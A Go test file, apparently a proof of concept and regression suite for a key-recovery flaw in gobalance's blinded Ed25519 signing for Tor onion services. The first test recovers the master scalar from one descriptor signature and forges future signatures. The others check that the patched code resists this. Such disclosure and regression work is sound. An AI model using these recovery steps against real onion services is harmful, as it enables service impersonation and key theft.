package poc

import (
	"bytes"
	"crypto/ed25519"
	"crypto/sha512"
	"math/big"
	"testing"

	"gobalance/pkg/stem/util"
	vulnerable "gobalance/poc/vulnerable"
)


func attackerHint(m []byte) *big.Int {
	d := sha512.Sum512(m)
	sum := new(big.Int)
	for i := 0; i < 512; i++ {
		bit := (d[i/8] >> (i % 8)) & 1
		sum.Add(sum, new(big.Int).Lsh(big.NewInt(int64(bit)), uint(i)))
	}
	return sum
}

func attackerKPrime() []byte {
	d := sha512.Sum512([]byte("Derive temporary signing key hash input"))
	return d[:32]
}

func attackerBlindingMult(nonce []byte) *big.Int {
	sum := new(big.Int)
	for i := 3; i < 254; i++ {
		bit := (nonce[i/8] >> (i % 8)) & 1
		sum.Add(sum, new(big.Int).Lsh(big.NewInt(int64(bit)), uint(i)))
	}
	return sum.Add(sum, new(big.Int).Lsh(big.NewInt(1), 254))
}

func attackerDecodeInt(s []byte) *big.Int {
	sum := new(big.Int)
	for i := 0; i < 256; i++ {
		bit := (s[i/8] >> (i % 8)) & 1
		sum.Add(sum, new(big.Int).Lsh(big.NewInt(int64(bit)), uint(i)))
	}
	return sum
}

var attackerL = new(big.Int).Add(new(big.Int).Lsh(big.NewInt(1), 252),
	bigFromDecimal("27742317777372353535851937790883648493"))

func bigFromDecimal(s string) *big.Int {
	v := new(big.Int)
	v.SetString(s, 10)
	return v
}

func makeVictimTorKey() (esk []byte, identityPub []byte) {
	_, seed, _ := ed25519.GenerateKey(nil)
	d := sha512.Sum512(seed)
	a := append([]byte{}, d[:32]...)
	a[0] &= 248
	a[31] &= 63
	a[31] |= 64
	esk = append(append([]byte{}, a...), d[32:]...)
	identityPub = attackerPubFromScalar(attackerDecodeInt(a))
	return
}

func attackerPubFromScalar(s *big.Int) []byte { return vulnerable.PubFromScalar(s) }


func Test01_Vulnerable_MasterKeyRecoveredFromSingleDescriptor(t *testing.T) {
	torKey, identityPub := makeVictimTorKey()

	nonce1 := bytes.Repeat([]byte{0xAB}, 32)
	nonce2 := bytes.Repeat([]byte{0xCD}, 32)
	blindedPub1 := vulnerable.BlindedPubkey(identityPub, nonce1)
	blindedPub2 := vulnerable.BlindedPubkey(identityPub, nonce2)

	msg1 := []byte("-----BEGIN ED25519 CERT----- period1 cert bytes -----END-----")
	msg2 := []byte("-----BEGIN ED25519 CERT----- period2 cert bytes -----END-----")
	sig1 := vulnerable.BlindedSignWithTorKey(msg1, ed25519.PrivateKey(torKey), blindedPub1, nonce1)
	sig2Real := vulnerable.BlindedSignWithTorKey(msg2, ed25519.PrivateKey(torKey), blindedPub2, nonce2)

	sPrime := vulnerable.RecoverBlindedScalar(msg1, sig1, blindedPub1)
	master := vulnerable.UnblindScalar(sPrime, nonce1)
	t.Logf("[ATTACK] master scalar recovered mod L: %x", master.Bytes())

	forged2 := vulnerable.ForgeBlindedSignature(msg2, master, blindedPub2, nonce2)
	if !bytes.Equal(forged2, sig2Real) {
		t.Fatal("forged signature differs from the victim's real signature")
	}
	t.Logf("[TAKEOVER] forged period-2 signature matches the victim's real signature byte-for-byte")
	t.Log("[TAKEOVER] => attacker can impersonate the onion service for ANY future period")
}


func Test02_Patched_TruncatedTorKeyRejected(t *testing.T) {
	torKey, identityPub := makeVictimTorKey()
	nonce := bytes.Repeat([]byte{0xAB}, 32)
	blindedPub := util.BlindedPubkey(identityPub, nonce)

	defer func() {
		if r := recover(); r == nil {
			t.Fatal("patched BlindedSignWithTorKey accepted a 32-byte scalar — regression!")
		} else {
			t.Logf("[DEFENSE] rejected truncated key: %v", r)
		}
	}()
	_ = util.BlindedSignWithTorKey([]byte("m"), ed25519.PrivateKey(torKey[:32]), blindedPub, nonce)
}


func Test03_Patched_TorPathSignaturesVerifyAsStdEd25519(t *testing.T) {
	torKey, identityPub := makeVictimTorKey()
	for _, nonce := range [][]byte{bytes.Repeat([]byte{0xAB}, 32), bytes.Repeat([]byte{0xCD}, 32)} {
		blindedPub := util.BlindedPubkey(identityPub, nonce)
		msg := []byte("descriptor cert bytes")
		sig := util.BlindedSignWithTorKey(msg, ed25519.PrivateKey(torKey), blindedPub, nonce)
		if !ed25519.Verify(blindedPub, msg, sig) {
			t.Fatalf("patched signature failed standard ed25519 verification (nonce %x)", nonce[:2])
		}
	}
	t.Log("[COMPAT] patched tor-path signatures verify as standard ed25519 under the blinded pubkey")
}


func Test04_Patched_AttackMathYieldsGarbage(t *testing.T) {
	torKey, identityPub := makeVictimTorKey()
	nonce1 := bytes.Repeat([]byte{0xAB}, 32)
	blindedPub1 := util.BlindedPubkey(identityPub, nonce1)
	msg1 := []byte("period 1 descriptor cert")
	sig1 := util.BlindedSignWithTorKey(msg1, ed25519.PrivateKey(torKey), blindedPub1, nonce1)

	r1 := attackerHint(bytes.Join([][]byte{attackerKPrime(), msg1}, nil))
	hval := attackerHint(bytes.Join([][]byte{sig1[:32], blindedPub1, msg1}, nil))
	sWrong := new(big.Int).Sub(attackerDecodeInt(sig1[32:]), r1)
	sWrong.Mul(sWrong, new(big.Int).ModInverse(hval, attackerL))
	sWrong.Mod(sWrong, attackerL)

	aWrong := new(big.Int).Mod(
		new(big.Int).Mul(sWrong, new(big.Int).ModInverse(attackerBlindingMult(nonce1), attackerL)), attackerL)

	d := sha512.Sum512(torKey[:32])
	if aWrong.Cmp(attackerDecodeInt(torKey[:32])) == 0 {
		t.Fatal("attack recovered the master scalar from a PATCHED signature — regression!")
	}
	_ = d
	t.Logf("[DEFENSE] attacker-recovered value (garbage): %x", aWrong.Bytes())
	t.Logf("[DEFENSE] true master scalar              : %x", attackerDecodeInt(torKey[:32]).Bytes())
	t.Log("[DEFENSE] => nonce prefix is now keyed by the secret PRF half; recovery is computationally dead")
}
